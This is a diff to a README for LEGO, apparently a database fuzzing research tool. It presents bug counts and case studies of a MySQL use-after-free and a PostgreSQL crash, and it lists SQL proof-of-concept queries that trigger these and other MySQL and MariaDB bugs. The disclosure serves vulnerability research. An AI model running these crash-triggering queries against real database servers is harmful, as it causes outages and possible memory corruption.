@@ -1,4 +1,4 @@
-## Bug Number Statistics
+# Bug Number Statistics
 | DBMS       | Bug Number |
 |------------|------------|
 | MySQL      | 22         |
@@ -10,10 +10,10 @@
 | PolarDB    | 15         |
 | Total      | 161        |
 
-## **Another CASE STUDY**
-LEGO found lots of bugs that are common in real-world queries. Here is an case study of UAF in MYSQL, which gets an CVE ID. 
+# **Cases Study And PoCs**
+LEGO found lots of bugs that are common in real-world queries. Here are some cases study of bugs found by LEGO. 
 
-### **CVE-XXXX-21303: A Use-After-Free Bug in MySQL**
+## **CVE-XXXX-21303: A Use-After-Free Bug in MySQL**
 The bug is hidden deeply in the *item_cmpfunc.cc* of MySQL. It triggered a use-after-free issue in class *Item_func_in*, which caused serious security damage to the database. Figure 1 shows a part of code for the class *Item_func_in* which is designed for IN expression. The *in_vector \*array* is the main member to store the temporary data of an expression. It also contains some other functions and variables for different operations. For example, the *cleanup()* is used to free the array.
 
 <center>
@@ -21,10 +21,10 @@ The bug is hidden deeply in the *item_cmpfunc.cc* of MySQL. It triggered a use-a
     box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" 
     src="./Figure/code.png">
     <br>
-    <div>Figure 1</div>
+    <div>Figure 1: a part of code for class Item_func_in</div>
 </center>
 
-### **The mechanism to trigger the bug.** 
+### The mechanism to trigger the bug. 
 Listing 1 shows the SQL query that triggers that bug. First, it creates a table *v0* and associates attribute *v3* with v1by using the *GENERATED* clause and *IN* expression. In the process, the *in_vector \*array* in *Item_func_in* would be used to store the temporary data in the associated column. 
 Then it executes the ALTER statement and the INSERT statement to change the structure of the table and insert the record into the table *v0*. However, the *cleanup()* function is called by mistake and the *in_vector \*array* is freed, which may still be used when operating the table *v0*.  Finally, a use-after-free happens when MySQL executes the SELECT statement to query data from *v0*. 
 
@@ -34,14 +34,14 @@ ALTER TABLE v0 ADD COLUMN v0 MEDIUMINT;
 INSERT IGNORE INTO v0 VALUES ('x','x','x',1);
 SELECT * FROM v0;
 ```
-<center>Listing 1</center>
+<center>Listing 1: the PoC to trigger the UAF</center>
 
-### **The damage of the bug.** 
+### The damage of the bug. 
 It is a high-severity UAF vulnerability, which could cause serious database security problems. When the SELECT statement is executed to query the data in the table, the array variable is previously freed, but it will be used again because the array internal function could still be called for related operations. If an attacker occupies the array object in advance through operations such as heap spray, the attacker may directly control the entire execution process and take the opportunity to obtain sensitive information of other users in the database, causing serious security damage.
 According to the *Oracle Security Alerts* analysis, the bugs can be used to directly attack the MySQL server by network with low complexity. Even without user interaction, it could also cause a high availability impact on MySQL server by an attacker.  
 
 
-### **SEGV in PostgreSQL**
+## **SEGV in PostgreSQL**
 We introduce and analyze a SEGV caused by a sequence that combines *NOTIFY* and *WITH* statements in PostgreSQL.
 The bug was introduced 2 years ago, which lies in PostgreSQL's optimizer component. It happens when the optimizer makes the plan for the query of a clause. Specifically, the bug is triggered by the unexpected sequence which composes the *NOTIFY* statement and the *WITH* clause.
 
@@ -52,9 +52,9 @@ CREATE OR REPLACE RULE v1 AS ON INSERT TO v0 DO INSTEAD NOTIFY COMPRESSION;
 COPY(SELECT 32 EXCEPT SELECT v3+16 FROM v0) TO STDOUT CSV HEADER;
 WITH v2 AS(INSERT INTO v0 VALUES(0)) DELETE FROM v0 WHERE v3 = ---48;
 ```
-<center>Listing 2</center>
+<center>Listing 2: the PoC to trigger the SEGV in PostgreSQL</center>
 
-### **The mechanism to trigger the bug.**
+### The mechanism to trigger the bug.
 Listing 2 shows a SQL query that could trigger that bug. First, it executes the *CREATE TABLE* statement to create a table *v0* in PostgreSQL. 
 Then it creates an instead rule on the *INSERT* operation for table *v0*, which executes an *NOTIFY* instead of inserting values.
 After executing the *COPY* operation to transfer data, it uses an *WITH* clause to create a temporary view, which updates the data of *v0* (i.e., inserts one value and deletes some other records). However, the SQL Type Sequence *CREATE RULE-->NOTIFY-->COPY-->WITH* constructs a logic that is not considered in PostgreSQL.
@@ -65,25 +65,22 @@ After executing the *COPY* operation to transfer data, it uses an *WITH* clause 
     box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);" 
     src="./Figure/postgres_code.jpg"  height="400">
     <br>
-    <div>Figure 2</div>
+    <div>Figure 2: the crash code of SEGV and fixing methods</div>
 </center>
 
 Figure 2 shows the relevant crash code to this bug, as well as the fixing methods.
 PostgreSQL crashes in its optimizer component's *replace_empty_jointree* function when the backend process makes plans for the *WITH* statement. The root cause of this bug is in PostgreSQL's rewrite component, which ignores the situation when a *NOTIFY* statement is followed by a *WITH* statement.
 
-Specifically, since the *NOTIFY* statement is associated with the *INSERT* operation for table *v0*, PostgreSQL will invoke the rewrite rule to replace the insert operation *INSERT INTO v0 VALUES (0)* in the *WITH* statement with a *NOTIFY* statement.
-In the code, PostgreSQL calls the *RewriteQuery* function to process insert statements in WITH clauses. However, *NOTIFY* commands are not supported to replace the *INSERT* statement in a *WITH* clause.
-In other words, it misses the case where a DML *sql-types* statement is rewritten by a *NOTIFY* statement. 
-As a result, PostgreSQL gets an NULL *jointree* which causes the SEGV in *replace_empty_jointree* in planning later. 
+Specifically, since the *NOTIFY* statement is associated with the *INSERT* operation for table *v0*, PostgreSQL will invoke the rewrite rule to replace the insert operation *INSERT INTO v0 VALUES (0)* in the *WITH* statement with a *NOTIFY* statement. In the code, PostgreSQL calls the *RewriteQuery* function to process insert statements in WITH clauses. However, *NOTIFY* commands are not supported to replace the *INSERT* statement in a *WITH* clause. In other words, it misses the case where a DML *sql-types* statement is rewritten by a *NOTIFY* statement. As a result, PostgreSQL gets an NULL *jointree* which causes the SEGV in *replace_empty_jointree* in planning later. 
 
-### **The reason for detecting the bug by LEGO.**
+### The reason for detecting the bug by LEGO.
 The bug is invoked by an unexpected SQL Type Sequence, which is rarely used by users as well as testers, and as a result, the bug hides for about 2 years. 
 With the analyzed the type-affinities, LEGO synthesizes abundant SQL Type Sequences containing the expected sequence. Based on the type sequence of corresponding synthesized queries,  LEGO mutates them into more queries effectively and finally synthesis the appropriate statements to trigger this bug.
 
 
 
 ## **SOME OTHER PoC of Bugs**
-### **MySQL**
+### MySQL
 ```SQL
 1. The PoC of CVE-XXXX-35644
 CREATE TABLE v0 (v2 MEDIUMINT PRIMARY KEY , v1 MEDIUMTEXT ) ;
@@ -91,7 +88,7 @@ INSERT INTO v0 (v3. *) VALUES (DEFAULT,DEFAULT) ;
 SELECT * FROM v0 WHERE v1 IN (255,15,83/97) ;
 SELECT * FROM v3 WHERE v1 IN (MINUTE(FALSE),-1/255) ;
 
-2. The PoC of CVE-XXXX-21303
+2. The PoC of CVE-XXXX-35642
 CREATE TABLE v0 ( v2 INT UNIQUE KEY STORAGE DEFAULT COMMENT 'x' SERIAL DEFAULT VALUE , v1 BINARY ( 0 ) ) ;
 CREATE UNIQUE INDEX PACK_KEYS ON v0 ( ( ( CASE 'x' WHEN v1 THEN v1 ELSE 60 / 0 END ) IS NOT FALSE ) DESC ) ;
 SELECT * FROM v0 AS x WHERE v2 IN ( 8 , 50 , 37 ) ;
@@ -101,11 +98,16 @@ SELECT * FROM v0 WHERE v1 IN ( v1 IN ( 'x' * 'x' ) , -1 ) ;
 CREATE TABLE v0 ( v1 SERIAL AS ( '' IS UNKNOWN ) ) ;
 CREATE TABLE v2 AS SELECT ( ( v1 BETWEEN 127 AND -1 ) + v1 AND 'x' ) LIMIT 92 OFFSET 2147483647 ;
 CREATE TABLE v3 ( v5 INT PRIMARY KEY , v4 INT ) ;
-INSERT INTO v2 ( ) VALUES ( 95 ) , ( 0 ) ;
+INSERT INTO v2 () VALUES (95) , (0) ;
 SELECT * FROM v0 , v3 WHERE 'x' ;
+
+4. The PoC of CVE-XXXX-35645
+CREATE TABLE v0 (v3 INT, v2 INT, v1 INT UNIQUE PRIMARY KEY);
+CREATE UNIQUE INDEX v4 ON v0((v2 IN('x'))ASC, (8));
+SELECT v3 NOT LIKE 'x' FROM v0 NONE WHERE v1 IN (8, '' LIKE NULL,TRUE,99);
 ```
 
-### **MariaDB**
+### MariaDB
 ```SQL
 1. CREATE TABLE v0 ( v2 SET ( 'x' ) DEFAULT 'x' , v1 BIGINT ) ENGINE = MEMORY ROW_FORMAT = COMPRESSED ( SELECT 35268330.000000 AS v3 , 3 ) ;
 START TRANSACTION ;
